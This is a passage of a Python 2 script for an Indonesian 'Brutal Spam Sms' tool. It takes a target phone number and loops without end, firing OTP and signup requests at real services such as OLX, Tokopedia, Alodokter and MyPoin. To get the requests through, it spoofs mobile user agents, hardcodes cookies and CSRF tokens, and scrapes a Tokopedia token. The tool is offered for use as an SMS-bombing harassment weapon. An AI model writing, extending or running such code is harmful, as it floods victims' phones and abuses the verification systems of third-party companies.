    run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
    run(p + '{' + h + '\xe2\x80\xa2' + p + '} ' + k + 'Author  ' + m + ': ' + bi + 'Sanz')
    run(p + '{' + h + '\xe2\x80\xa2' + p + '} ' + k + 'Youtube ' + m + ': ' + bi + 'SANZ SOEKAMTI')
    run(p + '{' + h + '\xe2\x80\xa2' + p + '} ' + k + 'Github  ' + m + ': ' + hg + 'github.com/B4N954N2-ID' + p)
    run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')


def menu():
    os.system('clear')
    time.sleep(0.2)
    logo()
    run(pu + '{' + h + '01' + pu + '}. ' + u + 'Manual Spam Sms  ' + m + '{ ' + pu + 'Unlimited ' + m + '}')
    run(pu + '{' + h + '02' + pu + '}. ' + u + 'Brutal Spam Sms  ' + m + '{ ' + pu + 'Unlimited ' + m + '}')
    run(pu + '{' + h + '03' + pu + '}. ' + u + 'Info Tools')
    run(pu + '{' + h + '00' + pu + '}. ' + m + 'Exit')
    run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
    try:
        requests.get('https://google.com')
    except ConnectionError:
        print p + '{' + m + '!' + p + '} ' + m + 'Check Your Connection'
        sys.exit()

    pil = raw_input(p + '{' + h + '\xe2\x80\xa2' + p + '}' + m + '> ' + pu + 'Choose' + m + ': ' + h)
    if pil == '1' or pil == '01':
        time.sleep(0.5)
        main()
    elif pil == '2' or pil == '02':
        try:
            time.sleep(0.5)
            os.system('clear')
            logo()
            run(p + '{' + h + '+' + p + '} ' + u + 'Contoh ' + m + ': ' + p + '08xxxxxxxxxx')
            no = raw_input(p + '{' + h + '+' + p + '} ' + u + 'Target ' + m + ': ' + p)
            run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
            time.sleep(4)
            print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Brutal Sms ' + k + no + p + ' {' + h + 'Success' + p + '}'
            if len(no) < 9:
                print p + '{' + m + '!' + p + '} ' + m + 'Nomor Tidak Valid'
                time.sleep(0.2)
                sys.exit()

            def idx():
                ua = {'Host': 'www.idmarco.com', 'accept': '*/*', 'x-requested-with': 'XMLHttpRequest', 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36'}
                dat = {'phone': no}
                r = requests.post('https://www.idmarco.com/smsotp/login/sendotp/', data=dat, headers=ua)
                if 'memek' in r:
                    print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Brutal Sms ' + k + no + p + ' {' + h + 'Success' + p + '}'

            def mapclub():
                ua = {'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36', 'Referer': 'https://www.mapclub.com/en/user/signup'}
                dat = {'phone': no}
                r = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
                if 'kontol' in r.text:
                    print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' { ' + h + 'Success ' + p + '}'

            def phdx(no):
                if str(no).startswith('08', 0) == True:
                    no = no.replace('08', '8')
                    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36', 'Referer': 'https://www.phd.co.id/en/users/createnewuser'}
                    r = requests.Session()
                    r.cookies = Cookie('.cookieslog')
                    r.headers = headers
                    data = {'requests_id': '', 'first_name': 'Subscribe YT', 'last_name': 'Jejak Cyber', 'gender': 'male', 'phone_number': no, 'birthday': '0000-00-00', 'username': 'YouTube@gmail.com', 'password': 'Subscribe 1000x Ya Anying', 'agreeterms': '1'}
                    send = r.post('http://www.phd.co.id/en/users/createNewUser', data=data, allow_redirects=True)
                    r.cookies.save()
                    if 'kontol' in send.text:
                        print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Spam Sms ' + k + '0' + str(no) + p + ' { ' + h + 'Success ' + p + '}'

            def olx():
                headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36', 'referer': 'https://www.olx.co.id/'}
                r = requests.Session()
                r.cookies = Cookie('.cookieslog')
                r.headers = headers
                data = {'grantType': 'phone', 'phone': no, 'language': ''}
                postData = r.post('https://www.olx.co.id/api/auth/authenticate', json=data, allow_redirects=True)
                if 'kontol' in postData.text:
                    print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' { ' + h + 'Success ' + p + '}'

            def psx():
                ua = {'accept': 'application/json, text/javascript, */*; q=0.01', 'origin': 'https://www.prosehat.com', 'x-requested-with': 'XMLHttpRequest', 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://www.prosehat.com/akun'}
                dat = {'phone_or_email': no, 'action': 'ajaxverificationsend'}
                send = requests.post('https://www.prosehat.com/wp-admin/admin-ajax.php', data=dat, headers=ua)
                if 'kontol' in send.text:
                    print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' { ' + h + 'Success ' + p + '}'

            def adx():
                ua = {'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36', 'content-type': 'application/json', 'referer': 'https://www.alodokter.com/login-alodokter', 'accept': 'application/json', 'origin': 'https://www.alodokter.com'}
                send = requests.post('https://www.alodokter.com/login-with-phone-number', headers=ua, json={'user': {'phone': no}})
                if 'kontol' in send.text:
                    print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' { ' + h + 'Success ' + p + '}'

            def hv():
                headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36', 'Referer': 'https://harvestcakes.com/register'}
                data = {'phone': no, 'url': ''}
                r = requests.Session()
                r.cookies = Cookie('.cookieslog')
                r.headers = headers
                send = r.post('https://harvestcakes.com/register', data=data, allow_redirects=True)
                if 'meki-meki' in send.text:
                    print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' { ' + h + 'Success ' + p + '}'

            def mpx():
                head = {'Host': 'mypoin.id', 'content-length': '104', 'accept': 'application/json, text/javascript, */*; q=0.01', 'sec-fetch-dest': 'empty', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://mypoin.id', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'referer': 'https://mypoin.id/register/validate-phone-number', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cookie': '__cfduid=dbf8226ca73eaed7de2b25941dc06183e1591828722', 'cookie': '_ga=GA1.2.121781716.1591828745', 'cookie': '_gid=GA1.2.1452578097.1591828745', 'cookie': '_gat_gtag_UA_108385159_1=1', 'cookie': 'csrftoken=JHORXxn6RJ9q8oUg2s1K4pA5e13nVkxwOpswJzpT4pwU9LAXf2sRvsddpwYoTZZM'}
                dat = {'phone': no + '&', 'csrfmiddlewaretoken': 'KSNW5PdHL3zekNPQbceTOGe5kodnJthpPArBRRfuYJWIlavxoMF0fJRdvT8oH8JF'}
                send = requests.post('https://mypoin.id/register/request-otp', data=dat, headers=head)
                if 'kontol' in send.text:
                    print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' { ' + h + 'Success ' + p + '}'

            def wa():
                head = {'Connection': 'keep-alive', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Origin': 'https://accounts.tokopedia.com', 'X-Requested-With': 'XMLHttpRequest', 'user-agent': '{acak}', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept-Encoding': 'gzip, deflate'}
                site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=' + no + '&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers=head).text
                search = re.search('\\<input\\ id\\=\\"Token\\"\\ value\\=\\"(.*?)\\"\\ type\\=\\"hidden\\"\\>', site).group(1)
                dat = {'otp_type': '116', 'msisdn': no, 'tk': search, 'email': '', 'original_param': '', 'user_id': '', 'signature': '', 'number_otp_digit': '6'}
                send = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=head, data=dat)
                if 'meki-meki' in send.text:
                    print p + '{' + h + '\xe2\x9c\x93' + p + '} ' + h + 'Spam Sms ' + k + no + p + ' { ' + h + 'Success ' + p + '}'

            while True:
                time.sleep(1)
                idx()
                time.sleep(1)
                mapclub()
                time.sleep(1)
                olx()
                time.sleep(1)
                psx()
                time.sleep(1)
                adx()
                time.sleep(1)
                hv()
                time.sleep(1)
                mpx()
                time.sleep(1)
                phdx(no)
                time.sleep(30)
                wa()

        except ConnectionError:
            print p + '{' + m + '!' + p + '} ' + m + 'Check Your Connection'
            exit()
        except KeyboardInterrupt:
            print p + '{' + m + '!' + p + '} ' + m + 'Stop' + p + '..'
            time.sleep(0.5)
            os.system('xdg-open https://youtube.com/SanzSoekamti')
            time.sleep(1)
            exit()
        except ValueError:
            print p + '{' + m + '!' + p + '} ' + m + 'Nomor Tidak Valid'
            exit()
        except SyntaxError:
            print p + '{' + m + '!' + p + '} ' + m + 'Harus Pake Angka Cuk'
            exit()
        except NameError:
            print p + '{' + m + '!' + p + '} ' + m + 'Harus Pake Angka Cuk'
            exit()

    elif pil == '3' or pil == '03':
        try:
            time.sleep(0.5)
            info()
            time.sleep(1)
        except KeyboardInterrupt:
            print p + '{' + m + '!' + p + '} ' + m + 'Ctrl + C Detected'
            time.sleep(0.5)
            os.system('xdg-open https://youtu.be/iI0DDdls9Fc')
            exit(0.5)

    elif pil == '0' or pil == '00':
        keluar()
    else:
        print p + '{' + m + '!' + p + '} ' + m + 'Wrong Input' + m + '!!'
        time.sleep(1)
        menu()


def main():
    os.system('clear')
    time.sleep(0.2)
    logo()
    run(pu + '{' + h + '01' + pu + '}. ' + u + 'Spam Sms IdMarco')
    run(pu + '{' + h + '02' + pu + '}. ' + u + 'Spam Sms Olx')
    run(pu + '{' + h + '03' + pu + '}. ' + u + 'Spam Sms MapClub')
    run(pu + '{' + h + '04' + pu + '}. ' + u + 'Spam Sms AirBnb')
    run(pu + '{' + h + '05' + pu + '}. ' + u + 'Spam Sms Gojek ' + p + '{' + m + '5x/30mnt' + p + '}')
    run(pu + '{' + h + '06' + pu + '}. ' + u + 'Spam Sms My Poin')
    run(pu + '{' + h + '07' + pu + '}. ' + u + 'Back To Menu')
    run(pu + '{' + h + '00' + pu + '}. ' + m + 'Exit')
    run(b + '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
    try:
        requests.get('https://google.com')
    except ConnectionError:
        print p + '{' + m + '!' + p + '} ' + m + 'Check Your Connection'
        sys.exit()

    nanya = raw_input(p + '{' + h + '\xe2\x80\xa2' + p + '}' + m + '> ' + pu + 'Choose' + m + ': ' + h)
    if nanya == '1' or nanya == '01':
        try:
            time.sleep(0.5)
            idm()
        except ConnectionError:
            print p + '{' + m + '!' + p + '} ' + m + 'Check Your Connection'
            exit()
        except KeyboardInterrupt:
            print p + '{' + m + '!' + p + '} ' + m + 'Stop' + p + '..'
            time.sleep(0.5)
            os.system('xdg-open https://youtube.com/SanzSoekamti')
            time.sleep(1)
            exit()
        except ValueError:
            print p + '{' + m + '!' + p + '} ' + m + 'Nomor Tidak Valid'
            exit()
        except SyntaxError:
            print p + '{' + m + '!' + p + '} ' + m + 'Harus Pake Angka Cuk'
            exit()
        except NameError:
            print p + '{' + m + '!' + p + '} ' + m + 'Harus Pake Angka Cuk'
            exit()

    if nanya == '2' or nanya == '02':
        try:
            time.sleep(0.5)
            olxx()
        except ConnectionError:
            print p + '{' + m + '!' + p + '} ' + m + 'Check Your Connection'
            exit()
        except KeyboardInterrupt:
            print p + '{' + m + '!' + p + '} ' + m + 'Stop' + p + '..'
            time.sleep(0.5)
            os.system('xdg-open https://youtube.com/SanzSoekamti')
            time.sleep(1)
            exit()
        except ValueError:
            print p + '{' + m + '!' + p + '} ' + m + 'Nomor Tidak Valid'
            exit()
        except SyntaxError:
            print p + '{' + m + '!' + p + '} ' + m + 'Harus Pake Angka Cuk'
            exit()
        except NameError:
            print p + '{' + m + '!' + p + '} ' + m + 'Harus Pake Angka Cuk'
            exit()

    if nanya == '3' or nanya == '03':
        try:
            time.sleep(0.5)
            mc()
        except ConnectionError:
            print p + '{' + m + '!' + p + '} ' + m + 'Check Your Connection'
            exit()
        except KeyboardInterrupt:
            print p + '{' + m + '!' + p + '} ' + m + 'Stop' + p + '..'
            time.sleep(0.5)
            os.system('xdg-open https://youtube.com/SanzSoekamti')
            time.sleep(1)
            exit()
        except ValueError:
            print p + '{' + m + '!' + p + '} ' + m + 'Nomor Tidak Valid'
            exit()
        except SyntaxError:
            print p + '{' + m + '!' + p + '} ' + m + 'Harus Pake Angka Cuk'
            exit()
        except NameError:
            print p + '{' + m + '!' + p + '} ' + m + 'Harus Pake Angka Cuk'
            exit()

    elif nanya == '4' or nanya == '04':
        try:
            time.sleep(0.5)
            anb()
        except ConnectionError:
            print p + '{' + m + '!' + p + '} ' + m + 'Check Your Connection'
            exit()
        except KeyboardInterrupt:
            print p + '{' + m + '!' + p + '} ' + m + 'Stop' + p + '..'
            time.sleep(0.5)
            os.system('xdg-open https://youtube.com/SanzSoekamti')
            time.sleep(1)
            exit()
        except ValueError:
            print p + '{' + m + '!' + p + '} ' + m + 'Nomor Tidak Valid'
            exit()
        except SyntaxError:
            print p + '{' + m + '!' + p + '} ' + m + 'Harus Pake Angka Cuk'
            exit()
        except NameError:
            print p + '{' + m + '!' + p + '} ' + m + 'Harus Pake Angka Cuk'
            exit()

    elif nanya == '5' or nanya == '05':
        try:
            time.sleep(0.5)
            gp()
        except ConnectionError:
            print p + '{' + m + '!' + p + '} ' + m + 'Check Your Connection'
            exit()
        except KeyboardInterrupt:
            print p + '{' + m + '!' + p + '} ' + m + 'Stop' + p + '..'
            time.sleep(0.5)
            os.system('xdg-open https://youtube.com/SanzSoekamti')
            time.sleep(1)
            exit()
        except ValueError:
            print p + '{' + m + '!' + p + '} ' + m + 'Nomor Tidak Valid'
            exit()
        except SyntaxError:
            print p + '{' + m + '!' + p + '} ' + m + 'Harus Pake Angka Cuk'
            exit()
        except NameError:
            print p + '{' + m + '!' + p + '} ' + m + 'Harus Pake Angka Cuk'
            exit()

    elif nanya == '6' or nanya == '06':
        try:
            time.sleep(0.5)
            mp()
        except ConnectionError:
            print p + '{' + m + '!' + p + '} ' + m + 'Check Your Connection'
            exit()
        except KeyboardInterrupt:
            print p + '{' + m + '!' + p + '} ' + m + 'Stop' + p + '..'
            time.sleep(0.5)
            os.system('xdg-open https://youtube.com/SanzSoekamti')
            time.sleep(1)
            exit()
        except ValueError:
            print p + '{' + m + '!' + p + '} ' + m + 'Nomor Tidak Valid'
            exit()
        except SyntaxError:
            print p + '{' + m + '!' + p + '} ' + m + 'Harus Pake Angka Cuk'
            exit()
        except NameError:
            print p + '{' + m + '!' + p + '} ' + m + 'Harus Pake Angka Cuk'
            exit()

    elif nanya == '7' or nanya == '07':
        try:
            time.sleep(0.5)
            menu()
        except ConnectionError:
            print p + '{' + m + '!' + p + '} ' + m + 'Check Your Connection'
            exit()
        except KeyboardInterrupt:
            print p + '{' + m + '!' + p + '} ' + m + 'Ctrl + Detected'
            time.sleep(0.5)
            os.system('xdg-open https://youtube.com/SanzSoekamti')
            time.sleep(1)
            exit()

    elif nanya == '0' or nanya == '00':
        keluar()
    else:
        print p + '{' + m + '!' + p + '} ' + m + 'Wrong Input' + m + '!!'
        time.sleep(1)
        main()


if __name__ == '__main__':
    try:
        token = open('Sanz', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        os.system('xdg-open https://youtube.com/SanzSoekamti')
        time.sleep(10)
        kontol = 'Tools Brutal Sms Unlimited by Sanz'
        memek = open('Sanz', 'w')
        memek.write(kontol)
        memek.close()
        menu()
    except KeyboardInterrupt:
        print p + '{' + m + '!' + p + '} ' + m + 'Ctrl + C Detected'
        time.sleep(0.5)
        os.system('xdg-open https://youtu.be/iI0DDdls9Fc')
        exit(0.5)

